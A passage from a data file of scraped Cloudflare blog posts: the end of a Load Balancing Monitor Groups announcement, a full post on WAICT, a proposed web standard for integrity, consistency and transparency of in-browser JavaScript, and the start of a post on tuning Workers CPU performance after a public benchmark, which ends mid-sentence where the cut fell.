critical monitor passed and a majority of the remaining monitors were healthy.]Finally, the results from all six checking data centers are combined to determine the final, global health status for the endpoint.Global Result: 5 out of the 6 total data centers (83%) report the endpoint as UP.Conclusion: Because 83% is greater than the 50% quorum threshold, the endpoint is considered globally healthy and will continue to receive traffic.This multi-layered quorum system provides incredible resilience, ensuring that failover decisions are based on a comprehensive and geographically distributed consensus. Getting Started with Monitor Groups Monitor Groups are now available via the API for all customers with an Enterprise Cloudflare Load Balancing subscription and will be made available to self-serve customers in the near future. To get started with building more sophisticated health checks for your applications today, check out our developer documentation. To create a monitor group, you can use a POST request to the new /load_balancers/monitor_groups endpoint. POST accounts/{account_id}/load_balancers/monitor_groups { \"description\": \"Monitor group for checkout service\", \"members\": [ { \"monitor_id\": \"string\", \"must_be_healthy\": true, \"enabled\": true }, { \"monitor_id\": \"string\", \"monitoring_only\": false, \"enabled\": true } ] } Once created, you can attach the group to a pool by referencing its ID in the monitor_group field of the pool object. What’s Next We are continuing to build a seamless platform experience that simplifies traffic management for both internal and external applications. Looking ahead, Monitor Groups will be making its way into the Dashboard for all users soon! We are also working on more flexible role-based access controls and even more advanced load-based load balancing capabilities to give you the granular control you need to manage your most complex applications.Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Load Balancing\nSeptember 25, 2024 1:00 PMTURN and anycast: making peer connections work globallyTURN servers relay media and data between devices when direct P2P connections are blocked or fail. Cloudflare Calls' TURN server uses anycast to eliminate the need to think about regions or scaling....By Nils Ohlmeier, Renan DincerBirthday Week, Cloudflare Calls, Anycast, Load Balancing, WebRTC, TURN\nJuly 16, 2024 1:02 PMEliminating hardware with Load Balancing and Cloudflare OneCloudflare is adding support for end-to-end private traffic flows to our local traffic management (LTM) load balancing solution, and allowing for the replacement of hardware load balancers...By Noah CrouchCloudflare One, Magic WAN, WARP, SASE, Load Balancing, Zero Trust, Hardware\nMay 31, 2024 1:00 PMExtending Private Network Load Balancing load balancing to Layer 4 with SpectrumCloudflare is adding support for all TCP and UDP traffic to our Private Network Load Balancing load balancing solution, extending the benefits of Private Network Load Balancing to more than just ...By Chris Ward, Brian Batraski, Mathew JacobSpectrum, Load Balancing, Cloudflare Zero Trust, Private Network, Private IP\nSeptember 08, 2023 1:00 PMElevate load balancing with Private IPs and Cloudflare Tunnels: a secure path to efficient traffic distributionWe are extremely excited to announce a new addition to our Load Balancing solution, Private Network Load Balancing with deep integrations with Zero Trust! ...By Brian Batraski, Mathew JacobLoad Balancing, Cloudflare Tunnel, Traffic", "timestamp": "2025-10-21T13:33:31.050644"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Improving the trustworthiness of Javascript on the Web", "url": "https://blog.cloudflare.com/improving-the-trustworthiness-of-javascript-on-the-web/", "published": "Thu, 16 Oct 2025 14:00:00 GMT", "content": "Improving the trustworthiness of Javascript on the Web2025-10-16Michael Rosenberg19 min readThe web is the most powerful application platform in existence. As long as you have the right API, you can safely run anything you want in a browser.Well… anything but cryptography.It is as true today as it was in 2011 that Javascript cryptography is Considered Harmful. The main problem is code distribution. Consider an end-to-end-encrypted messaging web application. The application generates cryptographic keys in the client’s browser that lets users view and send end-to-end encrypted messages to each other. If the application is compromised, what would stop the malicious actor from simply modifying their Javascript to exfiltrate messages?It is interesting to note that smartphone apps don’t have this issue. This is because app stores do a lot of heavy lifting to provide security for the app ecosystem. Specifically, they provide integrity, ensuring that apps being delivered are not tampered with, consistency, ensuring all users get the same app, and transparency, ensuring that the record of versions of an app is truthful and publicly visible.It would be nice if we could get these properties for our end-to-end encrypted web application, and the web as a whole, without requiring a single central authority like an app store. Further, such a system would benefit all in-browser uses of cryptography, not just end-to-end-encrypted apps. For example, many web-based confidential LLMs, cryptocurrency wallets, and voting systems use in-browser Javascript cryptography for the last step of their verification chains.In this post, we will provide an early look at such a system, called Web Application Integrity, Consistency, and Transparency (WAICT) that we have helped author. WAICT is a W3C-backed effort among browser vendors, cloud providers, and encrypted communication developers to bring stronger security guarantees to the entire web. We will discuss the problem we need to solve, and build up to a solution resembling the current transparency specification draft. We hope to build even wider consensus on the solution design in the near future. Defining the Web Application In order to talk about security guarantees of a web application, it is first necessary to define precisely what the application is. A smartphone application is essentially just a zip file. But a website is made up of interlinked assets, including HTML, Javascript, WASM, and CSS, that can each be locally or externally hosted. Further, if any asset changes, it could drastically change the functioning of the application. A coherent definition of an application thus requires the application to commit to precisely the assets it loads. This is done using integrity features, which we describe now. Subresource Integrity An important building block for defining a single coherent application is subresource integrity (SRI). SRI is a feature built into most browsers that permits a website to specify the cryptographic hash of external resources, e.g., <script src=\"https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.13.7/underscore-min.js\" integrity=\"sha512-dvWGkLATSdw5qWb2qozZBRKJ80Omy2YN/aF3wTUVC5+D1eqbA+TjWpPpoj8vorK5xGLMa2ZqIeWCpDZP/+pQGQ==\"></script> This causes the browser to fetch underscore.js from cdnjs.cloudflare.com and verify that its SHA-512 hash matches the given hash in the tag. If they match, the script is loaded. If not, an error is thrown and nothing is executed.If every external script, stylesheet, etc. on a page comes with an SRI integrity attribute, then the whole page is defined by just its HTML. This is close to what we want, but a web application can consist of many pages, and there is no way for a page to enforce the hash of the pages it links to. Integrity Manifest We would like to have a way of enforcing integrity on an entire site, i.e., every asset under a domain. For this, WAICT defines an integrity manifest, a configuration file that websites can provide to clients. One important item in the manifest is the asset hashes dictionary, mapping a hash belonging to an asset that the browser might load from that domain, to the path of that asset. Assets that may occur at any path, e.g., an error page, map to the empty string: \"hashes\": { \"81db308d0df59b74d4a9bd25c546f25ec0fdb15a8d6d530c07a89344ae8eeb02\": \"/assets/js/main.js\", \"fbd1d07879e672fd4557a2fa1bb2e435d88eac072f8903020a18672d5eddfb7c\": \"/index.html\", \"5e737a67c38189a01f73040b06b4a0393b7ea71c86cf73744914bbb0cf0062eb\": \"/vendored/main.css\", \"684ad58287ff2d085927cb1544c7d685ace897b6b25d33e46d2ec46a355b1f0e\": \"\", \"f802517f1b2406e308599ca6f4c02d2ae28bb53ff2a5dbcddb538391cb6ad56a\": \"\" } The other main component of the manifest is the integrity policy, which tells the browser which data types are being enforced and how strictly. For example, the policy in the manifest below will:Reject any script before running it, if it’s missing an SRI tag and doesn’t appear in the hashesReject any WASM possibly after running it, if it’s missing an SRI tag and doesn’t appear in hashes \"integrity-policy\": \"blocked-destinations=(script), checked-destinations=(wasm)\" Put together, these make up the integrity manifest: \"manifest\": { \"version\": 1, \"integrity-policy\": ..., \"hashes\": ..., } Thus, when both SRI and integrity manifests are used, the entire site and its interpretation by the browser is uniquely determined by the hash of the integrity manifest. This is exactly what we wanted. We have distilled the problem of endowing authenticity, consistent distribution, etc. to a web application to one of endowing the same properties to a single hash. Achieving Transparency Recall, a transparent web application is one whose code is stored in a publicly accessible, append-only log. This is helpful in two ways: 1) if a user is served malicious code and they learn about it, there is a public record of the code they ran, and so they can prove it to external parties, and 2) if a user is served malicious code and they don’t learn about it, there is still a chance that an external auditor may comb through the historical web application code and find the malicious code anyway. Of course, transparency does not help detect malicious code or even prevent its distribution, but it at least makes it publicly auditable.Now that we have a single hash that commits to an entire website’s contents, we can talk about ensuring that that hash ends up in a public log. We have several important requirements here:Do not break existing sites. This one is a given. Whatever system gets deployed, it should not interfere with the correct functioning of existing websites. Participation in transparency should be strictly opt-in.No added round trips. Transparency should not cause extra network round trips between the client and the server. Otherwise there will be a network latency penalty for users who want transparency.User privacy. A user should not have to identify themselves to any party more than they already do. That means no connections to new third parties, and no sending identifying information to the website.User statelessness. A user should not have to store site-specific data. We do not want solutions that rely on storing or gossipping per-site cryptographic information.Non-centralization. There should not be a single point of failure in the system—if any single party experiences downtime, the system should still be able to make progress. Similarly, there should be no single point of trust—if a user distrusts any single party, the user should still receive all the security benefits of the system.Ease of opt-in. The barrier of entry for transparency should be as low as possible. A site operator should be able to start logging their site cheaply and without being an expert.Ease of opt-out. It should be easy for a website to stop participating in transparency. Further, to avoid accidental lock-in like the defunct HPKP spec, it should be possible for this to happen even if all cryptographic material is lost, e.g., in the seizure or selling of a domain.Opt-out is transparent. As described before, because transparency is optional, it is possible for an attacker to disable the site’s transparency, serve malicious content, then enable transparency again. We must make sure this kind of attack is detectable, i.e., the act of disabling transparency must itself be logged somewhere.Monitorability. A website operator should be able to efficiently monitor the transparency information being published about their website. In particular, they should not have to run a high-network-load, always-on program just to notify them if their site has been hijacked.With these requirements in place, we can move on to construction. We introduce a data structure that will be essential to the design. Hash Chain Almost everything in transparency is an append-only log, i.e., a data structure that acts like a list and has the ability to produce an inclusion proof, i.e., a proof that an element occurs at a particular index in the list; and a consistency proof, i.e., a proof that a list is an extension of a previous version of the list. A consistency proof between two lists demonstrates that no elements were modified or deleted, only added.The simplest possible append-only log is a hash chain, a list-like data structure wherein each subsequent element is hashed into the running chain hash. The final chain hash is a succinct representation of the entire list. A hash chain. The green nodes represent the chain hash, i.e., the hash of the element below it, concatenated with the previous chain hash. The proof structures are quite simple. To prove inclusion of the element at index i, the prover provides the chain hash before i, and all the elements after i: Proof of inclusion for the second element in the hash chain. The verifier knows only the final chain hash. It checks equality of the final computed chain hash with the known final chain hash. The light green nodes represent hashes that the verifier computes. Similarly, to prove consistency between the chains of size i and j, the prover provides the elements between i and j: Proof of consistency of the chain of size one and chain of size three. The verifier has the chain hashes from the starting and ending chains. It checks equality of the final computed chain hash with the known ending chain hash. The light green nodes represent hashes that the verifier computes. Building Transparency We can use hash chains to build a transparency scheme for websites. Per-Site Logs As a first step, let’s give every site its own log, instantiated as a hash chain (we will discuss how these all come together into one big log later). The items of the log are just the manifest of the site at a particular point in time: A site’s hash chain-based log, containing three historical manifests. In reality, the log does not store the manifest itself, but the manifest hash. Sites designate an asset host that knows how to map hashes to the data they reference. This is a content-addressable storage backend, and can be implemented using strongly cached static hosting solutions.A log on its own is not very trustworthy. Whoever runs the log can add and remove elements at will and then recompute the hash chain. To maintain the append-only-ness of the chain, we designate a trusted third party, called a witness. Given a hash chain consistency proof and a new chain hash, a witness:Verifies the consistency proof with respect to its old stored chain hash, and the new provided chain hash.If successful, signs the new chain hash along with a signature timestamp.Now, when a user navigates to a website with transparency enabled, the sequence of events is:The site serves its manifest, an inclusion proof showing that the manifest appears in the log, and all the signatures from all the witnesses who have validated the log chain hash.The browser verifies the signatures from whichever witnesses it trusts.The browser verifies the inclusion proof. The manifest must be the newest entry in the chain (we discuss how to serve old manifests later).The browser proceeds with the usual manifest and SRI integrity checks.At this point, the user knows that the given manifest has been recorded in a log whose chain hash has been saved by a trustworthy witness, so they can be reasonably sure that the manifest won’t be removed from history. Further, assuming the asset host functions correctly, the user knows that a copy of all the received code is readily available.The need to signal transparency. The above algorithm works, but we have a problem: if an attacker takes control of a site, they can simply stop serving transparency information and thus implicitly disable transparency without detection. So we need an explicit mechanism that keeps track of every website that has enrolled into transparency. The Transparency Service To store all the sites enrolled into transparency, we want a global data structure that maps a site domain to the site log’s chain hash. One efficient way of representing this is a prefix tree (a.k.a., a trie). Every leaf in the tree corresponds to a site’s domain, and its value is the chain hash of that site’s log, the current log size, and the site’s asset host URL. For a site to prove validity of its transparency data, it will have to present an inclusion proof for its leaf. Fortunately, these proofs are efficient for prefix trees. A prefix tree with four elements. Each leaf’s path corresponds to a domain. Each leaf’s value is the chain hash of its site’s log. To add itself to the tree, a site proves possession of its domain to the transparency service, i.e., the party that operates the prefix tree, and provides an asset host URL. To update the entry, the site sends the new entry to the transparency service, which will compute the new chain hash. And to unenroll from transparency, the site just requests to have its entry removed from the tree (an adversary can do this too; we discuss how to detect this below). Proving to Witnesses and Browsers Now witnesses only need to look at the prefix tree instead of individual site logs, and thus they must verify whole-tree updates. The most important thing to ensure is that every site’s log is append-only. So whenever the tree is updated, it must produce a “proof” containing every new/deleted/modified entry, as well as a consistency proof for each entry showing that the site log corresponding to that entry has been properly appended to. Once the witness has verified this prefix tree update proof, it signs the root. The sequence of updating a site’s assets and serving the site with transparency enabled.The client-side verification procedure is as in the previous section, with two modifications:The client now verifies two inclusion proofs: one for the integrity policy’s membership in the site log, and one for the site log’s membership in a prefix tree.The client verifies the signature over the prefix tree root, since the witness no longer signs individual chain hashes. As before, the acceptable public keys are whichever witnesses the client trusts.Signaling transparency. Now that there is a single source of truth, namely the prefix tree, a client can know a site is enrolled in transparency by simply fetching the site’s entry in the tree. This alone would work, but it violates our requirement of “no added round trips,” so we instead require that client browsers will ship with the list of sites included in the prefix tree. We call this the transparency preload list. If a site appears in the preload list, the browser will expect it to provide an inclusion proof in the prefix tree, or else a proof of non-inclusion in a newer version of the prefix tree, thereby showing they’ve unenrolled. The site must provide one of these proofs until the last preload list it appears in has expired. Finally, even though the preload list is derived from the prefix tree, there is nothing enforcing this relationship. Thus, the preload list should also be published transparently. Filling in Missing Properties Remember we still have the requirements of monitorability, opt-out being transparent, and no single point of failure/trust. We fill in those details now.Adding monitorability. So far, in order for a site operator to ensure their site was not hijacked, they would have to constantly query every transparency service for its domain and verify that it hasn’t been tampered with. This is certainly better than the 500k events per hour that CT monitors have to ingest, but it still requires the monitor to be constantly polling the prefix tree, and it imposes a constant load for the transparency service.We add a field to the prefix tree leaf structure: the leaf now stores a “created” timestamp, containing the time the leaf was created. Witnesses ensure that the “created” field remains the same over all leaf updates (and it is deleted when the leaf is deleted). To monitor, a site operator need only keep the last observed “created” and “log size” fields of its leaf. If it fetches the latest leaf and sees both unchanged, it knows that no changes occurred since the last check.Adding transparency of opt-out. We must also do the same thing as above for leaf deletions. When a leaf is deleted, a monitor should be able to learn when the deletion occurred within some reasonable time frame. Thus, rather than outright removing a leaf, the transparency service responds to unenrollment requests by replacing the leaf with a tombstone value, containing just a “created” timestamp. As before, witnesses ensure that this field remains unchanged until the leaf is permanently deleted (after some visibility period) or re-enrolled.Permitting multiple transparency services. Since we require that there be no single point of failure or trust, we imagine an ecosystem where there are a handful of non-colluding, reasonably trustworthy transparency service providers, each with their own prefix tree. Like Certificate Transparency (CT), this set should not be too large. It must be small enough that reasonable levels of trust can be established, and so that independent auditors can reasonably handle the load of verifying all of them.Ok that’s the end of the most technical part of this post. We’re now going to talk about how to tweak this system to provide all kinds of additional nice properties. (Not) Achieving Consistency Transparency would be useless if, every time a site updates, it serves 100,000 new versions of itself. Any auditor would have to go through every single version of the code in order to ensure no user was targeted with malware. This is bad even if the velocity of versions is lower. If a site publishes just one new version per week, but every version from the past ten years is still servable, then users can still be served extremely old, potentially vulnerable versions of the site, without anyone knowing. Thus, in order to make transparency valuable, we need consistency, the property that every browser sees the same version of the site at a given time.We will not achieve the strongest version of consistency, but it turns out that weaker notions are sufficient for us. If, unlike the above scenario, a site had 8 valid versions of itself at a given time, then that would be pretty manageable for an auditor. So even though it’s true that users don’t all see the same version of the site, they will all still benefit from transparency, as desired.We describe two types of inconsistency and how we mitigate them. Tree Inconsistency Tree inconsistency occurs when transparency services’ prefix trees disagree on the chain hash of a site, thus disagreeing on the history of the site. One way to fully eliminate this is to establish a consensus mechanism for prefix trees. A simple one is majority voting: if there are five transparency services, a site must present three tree inclusion proofs to a user, showing the chain hash is present in three trees. This, of course, triples the tree inclusion proof size, and lowers the fault tolerance of the entire system (if three log operators go down, then no transparent site can publish any updates).Instead of consensus, we opt to simply limit the amount of inconsistency by limiting the number of transparency services. In 2025, Chrome trusts eight Certificate Transparency logs. A similar number of transparency services would be fine for our system. Plus, it is still possible to detect and prove the existence of inconsistencies between trees, since roots are signed by witnesses. So if it becomes the norm to use the same version on all trees, then social pressure can be applied when sites violate this. Temporal Inconsistency Temporal inconsistency occurs when a user gets a newer or older version of the site (both still unexpired), depending on some external factors such as geographic location or cookie values. In the extreme, as stated above, if a signed prefix root is valid for ten years, then a site can serve a user any version of the site from the last ten years.As with tree inconsistency, this can be resolved using consensus mechanisms. If, for example, the latest manifest were published on a blockchain, then a user could fetch the latest blockchain head and ensure they got the latest version of the site. However, this incurs an extra network round trip for the client, and requires sites to wait for their hash to get published on-chain before they can update. More importantly, building this kind of consensus mechanism into our specification would drastically increase its complexity. We’re aiming for v1.0 here.We mitigate temporal inconsistency by requiring reasonably short validity periods for witness signatures. Making prefix root signatures valid for, e.g., one week would drastically limit the number of simultaneously servable versions. The cost is that site operators must now query the transparency service at least once a week for the new signed root and inclusion proof, even if nothing in the site changed. The sites cannot skip this, and the transparency service must be able to handle this load. This parameter must be tuned carefully. Beyond Integrity, Consistency, and Transparency Providing integrity, consistency, and transparency is already a huge endeavor, but there are some additional app store-like security features that can be integrated into this system without too much work. Code Signing One problem that WAICT doesn’t solve is that of provenance: where did the code the user is running come from, precisely? In settings where audits of code happen frequently, this is not so important, because some third party will be reading the code regardless. But for smaller self-hosted deployments of open-source software, this may not be viable. For example, if Alice hosts her own version of Cryptpad for her friend Bob, how can Bob be sure the code matches the real code in Cryptpad’s Github repo?WEBCAT. The folks at the Freedom of Press Foundation (FPF) have built a solution to this, called WEBCAT. This protocol allows site owners to announce the identities of the developers that have signed the site’s integrity manifest, i.e., have signed all the code and other assets that the site is serving to the user. Users with the WEBCAT plugin can then see the developer’s Sigstore signatures, and trust the code based on that.We’ve made WAICT extensible enough to fit WEBCAT inside and benefit from the transparency components. Concretely, we permit manifests to hold additional metadata, which we call extensions. In this case, the extension holds a list of developers’ Sigstore identities. To be useful, browsers must expose an API for browser plugins to access these extension values. With this API, independent parties can build plugins for whatever feature they wish to layer on top of WAICT. Cooldown So far we have not built anything that can prevent attacks in the moment. An attacker who breaks into a website can still delete any code-signing extensions, or just unenroll the site from transparency entirely, and continue with their attack as normal. The unenrollment will be logged, but the malicious code will not be, and by the time anyone sees the unenrollment, it may be too late.To prevent spontaneous unenrollment, we can enforce unenrollment cooldown client-side. Suppose the cooldown period is 24 hours. Then the rule is: if a site appears on the preload list, then the client will require that either 1) the site have transparency enabled, or 2) the site have a tombstone entry that is at least 24 hours old. Thus, an attacker will be forced to either serve a transparency-enabled version of the site, or serve a broken site for 24 hours.Similarly, to prevent spontaneous extension modifications, we can enforce extension cooldown on the client. We will take code signing as an example, saying that any change in developer identities requires a 24 hour waiting period to be accepted. First, we require that extension dev-ids has a preload list of its own, letting the client know which sites have opted into code signing (if a preload list doesn’t exist then any site can delete the extension at any time). The client rule is as follows: if the site appears in the preload list, then both 1) dev-ids must exist as an extension in the manifest, and 2) dev-ids-inclusion must contain an inclusion proof showing that the current value of dev-ids was in a prefix tree that is at least 24 hours old. With this rule, a client will reject values of dev-ids that are newer than a day. If a site wants to delete dev-ids, they must 1) request that it be removed from the preload list, and 2) in the meantime, replace the dev-ids value with the empty string and update dev-ids-inclusion to reflect the new value. Deployment Considerations There are a lot of distinct roles in this ecosystem. Let’s sketch out the trust and resource requirements for each role.Transparency service. These parties store metadata for every transparency-enabled site on the web. If there are 100 million domains, and each entry is 256B each (a few hashes, plus a URL), this comes out to 26GB for a single tree, not including the intermediate hashes. To prevent size blowup, there would probably have to be a pruning rule that unenrolls sites after a long inactivity period. Transparency services should have largely uncorrelated downtime, since, if all services go down, no transparency-enabled site can make any updates. Thus, transparency services must have a moderate amount of storage, be relatively highly available, and have downtime periods uncorrelated with each other.Transparency services require some trust, but their behavior is narrowly constrained by witnesses. Theoretically, a service can replace any leaf’s chain hash with its own, and the witness will validate it (as long as the consistency proof is valid). But such changes are detectable by anyone that monitors that leaf.Witness. These parties verify prefix tree updates and sign the resulting roots. Their storage costs are similar to that of a transparency service, since they must keep a full copy of a prefix tree for every transparency service they witness. Also like the transparency services, they must have high uptime. Witnesses must also be trusted to keep their signing key secret for a long period of time, at least long enough to permit browser trust stores to be updated when a new key is created.Asset host. These parties carry little trust. They cannot serve bad data, since any query response is hashed and compared to a known hash. The only malicious behavior an asset host can do is refuse to respond to queries. Asset hosts can also do this by accident due to downtime.Client. This is the most trust-sensitive part. The client is the software that performs all the transparency and integrity checks. This is, of course, the web browser itself. We must trust this.We at Cloudflare would like to contribute what we can to this ecosystem. It should be possible to run both a transparency service and a witness. Of course, our witness should not monitor our own transparency service. Rather, we can witness other organizations’ transparency services, and our transparency service can be witnessed by other organizations. Supporting Alternate Ecosystems WAICT should be compatible with non-standard ecosystems, ones where the large players do not really exist, or at least not in the way they usually do. We are working with the FPF on defining transparency for alternate ecosystems with different network and trust environments. The primary example we have is that of the Tor ecosystem.A paranoid Tor user may not trust existing transparency services or witnesses, and there might not be any other trusted party with the resources to self-host these functionalities. For this use case, it may be reasonable to put the prefix tree on a blockchain somewhere. This makes the usual domain validation impossible (there’s no validator server to speak of), but this is fine for onion services. Since an onion address is just a public key, a signature is sufficient to prove ownership of the domain.One consequence of a consensus-backed prefix tree is that witnesses are now unnecessary, and there is only need for the single, canonical, transparency service. This mostly solves the problems of tree inconsistency at the expense of latency of updates. Next Steps We are still very early in the standardization process. One of the more immediate next steps is to get subresource integrity working for more data types, particularly WASM and images. After that, we can begin standardizing the integrity manifest format. And then after that we can start standardizing all the other features. We intend to work on this specification hand-in-hand with browsers and the IETF, and we hope to have some exciting betas soon.In the meantime, you can follow along with our transparency specification draft, check out the open problems, and share your ideas. Pull requests and issues are always welcome! Acknowledgements Many thanks to Dennis Jackson from Mozilla for the lengthy back-and-forth meetings on design, to Giulio B and Cory Myers from FPF for their immensely helpful influence and feedback, and to Richard Hansen for great feedback.Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. SecurityMalicious JavaScriptJavaScriptDeep DiveCryptographyResearch\nOctober 08, 2025 2:00 PMHow we found a bug in Go's arm64 compiler84 million requests a second means even rare bugs appear often. We'll reveal how we discovered a race condition in the Go arm64 compiler and got it fixed....By Thea HeinenDeep Dive, Go, Programming\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMCloudflare just got faster and more secure, powered by RustWe’ve replaced the original core system in Cloudflare with a new modular Rust-based proxy, replacing NGINX. ...By Richard Boulton, Steve Goldsmith, Maurizio Abba, Matthew BullockBirthday Week, Rust, NGINX, Deep Dive, Engineering\nSeptember 25, 2025 2:00 PMSafe in the sandbox: security hardening for Cloudflare WorkersWe are further hardening Cloudflare Workers with the latest software and hardware features. We use defense-in-depth, including V8 sandboxes and the CPU's memory protection keys to keep your data safe....By Erik Corry, Ketan GuptaCloudflare Workers, Birthday Week, Attacks, Engineering, Linux, Malicious JavaScript, Security, Vulnerabilities", "timestamp": "2025-10-21T13:33:31.782763"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Unpacking Cloudflare Workers CPU Performance Benchmarks", "url": "https://blog.cloudflare.com/unpacking-cloudflare-workers-cpu-performance-benchmarks/", "published": "Tue, 14 Oct 2025 20:00:25 GMT", "content": "Unpacking Cloudflare Workers CPU Performance Benchmarks2025-10-14Kenton Varda17 min readOn October 4, independent developer Theo Browne published a series of benchmarks designed to compare server-side JavaScript execution speed between Cloudflare Workers and Vercel, a competing compute platform built on AWS Lambda. The initial results showed Cloudflare Workers performing worse than Node.js on Vercel at a variety of CPU-intensive tasks, by a factor of as much as 3.5x.We were surprised by the results. The benchmarks were designed to compare JavaScript execution speed in a CPU-intensive workload that never waits on external services. But, Cloudflare Workers and Node.js both use the same underlying JavaScript engine: V8, the open source engine from Google Chrome. Hence, one would expect the benchmarks to be executing essentially identical code in each environment. Physical CPUs can vary in performance, but modern server CPUs do not vary by anywhere near 3.5x.On investigation, we discovered a wide range of small problems that contributed to the disparity, ranging from some bad tuning in our infrastructure, to differences between the JavaScript libraries used on each platform, to some issues with the test itself. We spent the week working on many of these problems, which means over the past week Workers got better and faster for all of our customers. We even fixed some problems that affect other compute providers but not us, such as an issue that made trigonometry functions much slower on Vercel. This post will dig into all the gory details. It's important to note that the original benchmark was not representative of billable CPU usage on Cloudflare, nor did the issues involved impact most typical workloads. Most of the disparity was an artifact of the specific benchmark methodology. Read on to understand why.With our fixes, the results now look much more like we'd expect: There is still work to do, but we're happy to say that after these changes, Cloudflare now performs on par with Vercel in every benchmark case except the one based on Next.js. On that benchmark, the gap has closed considerably, and we expect to be able to eliminate it with further improvements detailed later in this post.We are grateful to Theo for highlighting areas where we could make improvements, which will now benefit all our customers, and even many who aren't our customers. Our benchmark methodology We wanted to run Theo's test with no major design changes, in order to keep numbers comparable. Benchmark cases are nearly identical to Theo's original test but we made a couple changes in how we ran the test, in the hopes of making the results more accurate:Theo ran the test client on a laptop connected by a Webpass internet connection in San Francisco, against Vercel instances running in its sfo1 region. In order to make our results easier to reproduce, we chose instead to run our test client directly in AWS's us-east-1 datacenter, invoking Vercel instances running in its iad1 region (which we understand to be in the same building). We felt this would minimize any impact from network latency. Because of this, Vercel's numbers are slightly better in our results than they were in Theo's.We chose to use Vercel instances with 1 vCPU instead of 2. All of the benchmarks are single-threaded workloads, meaning they cannot take advantage of a second CPU anyway. Vercel's CTO, Malte Ubl, had stated publicly on X that using single-CPU instances would make no difference in this test, and indeed, we found this to be correct. Using 1 vCPU makes it easier to reason about pricing, since both Vercel and Cloudflare charge for CPU time ($0.128/hr for Vercel in iad1, and $0.072/hr for Cloudflare globally).We made some changes to fix bugs in the test, for which we submitted a pull request. More on this below. Cloudflare platform improvements Theo's benchmarks covered a variety of frameworks, making it clear that no single JavaScript library could be at fault for the general problem. Clearly, we needed to look first at the Workers Runtime itself. And so we did, and we found two problems – not bugs, but tuning and heuristic choices which interacted poorly with the benchmarks as written. Sharding and warm isolate routing: A problem of scheduling, not CPU speed Over the last year we shipped smarter routing that sends traffic to warm isolates more often. That cuts cold starts for large apps, which matters for frameworks with heavy initialization requirements like Next.js. The original policy optimized for latency and throughput across billions of requests, but was less optimal for heavily CPU-bound workloads for the same reason that such workloads cause performance issues in other platforms like Node.js: When the CPU is busy computing an expensive operation for one request, other requests sent to the same isolate must wait for it to finish before they can proceed.The system uses heuristics to detect when requests are getting blocked behind each other, and automatically spin up more isolates to compensate. However, these heuristics are not precise, and the particular workload generated by Theo's tests – in which a burst of expensive traffic would come from a single client – played poorly with our existing algorithm. As a result, the benchmarks showed much higher latency (and variability in latency) than would normally be expected.It's important to understand that, as a result of this problem, the benchmark was not really measuring CPU time. Pricing on the Workers platform is based on CPU time – that is, time spent actually executing JavaScript code, as opposed to time waiting for things. Time spent waiting for the isolate to become available makes the request take longer, but is not billed as CPU time against the waiting request. So, this problem would not have affected your bill.After analyzing the benchmarks, we updated the algorithm to detect sustained CPU-heavy work earlier, then bias traffic so that new isolates spin up faster. The result is that Workers can more effectively and efficiently autoscale when different workloads are applied. I/O-bound workloads coalesce into individual already warm isolates while CPU-bound are directed so that they do not block each other. This change has already been rolled out globally and is enabled automatically for everyone. It should be pretty clear from the graph when the change was rolled out: V8 garbage collector tuning While this scheduling issue accounted for the majority of the disparity in the benchmark, we did find a minor issue affecting code execution performance during our testing.The range of issues that we uncovered in the framework code in these benchmarks repeatedly pointed at garbage collection and memory management issues as being key contributors to the results. But, we would expect these to be an issue with the same frameworks running in Node.js as well. To see exactly what was going on differently with Workers and why it was causing such a significant degradation in performance, we had to look inwards at our own memory management configuration.The V8 garbage collector has a huge number of knobs that can be tuned that directly impact performance. One of these is the size of the \"young generation\". This is where newly created objects go initially. It's a memory area that's less compact, but optimized for short-lived objects. When objects have bounced around the \"young space\" for a few generations they get moved to the old space, which is more compact, but requires more CPU to reclaim.V8 allows the embedding runtime to tune the size of the young generation. And it turns out, we had done so. Way back in June of 2017, just two months after the Workers project kicked off, we – or specifically, I, Kenton, as I was the only engineer on the project at the time – had configured this value according to V8's recommendations at the time for environments with 512MB of memory or less. Since Workers defaults to a limit of 128MB per isolate, this seemed appropriate.V8's entire garbage collector has changed dramatically since 2017. When analyzing the benchmarks, it became apparent that the setting which made sense in 2017 no longer made sense in 2025, and we were now limiting V8's young space too rigidly. Our configuration was causing V8's garbage collection to work harder and more frequently than it otherwise needed to. As a result, we have backed off on the manual tuning and now allow V8 to pick its young space size more freely, based on its internal heuristics. This is already live on Cloudflare Workers, and it has given an approximately 25% boost to the benchmarks with only a small increase in memory usage. Of course, the benchmarks are not the only Workers that benefit: all Workers should now be faster. That said, for most Workers the difference has been much smaller. Tuning OpenNext for performance The platform changes solved most of the problem. Following the changes, our testing showed we were now even on all of the benchmarks save one: Next.js.Next.js is a popular web application framework which, historically, has not had built-in support for hosting on a wide range of platforms. Recently, a project called OpenNext has arisen to fill the gap, making Next.js work well on many platforms, including Cloudflare. On investigation, we found several missing optimizations and other opportunities to improve performance, explaining much of why the benchmark performed poorly on Workers. Unnecessary allocations and copies When profiling the benchmark code, we noticed that garbage collection was dominating the timeline. From 10-25% of the request processing time was being spent reclaiming memory. So we dug in and discovered that OpenNext, and in some cases Next.js and React itself, will often create unnecessary copies of internal data buffers at some of the worst times during the handling of the process. For instance, there's one pipeThrough() operation in the rendering pipeline that we saw creating no less than 50 2048-byte Buffer instances, whether they are actually used or not.We further discovered that on every request, the 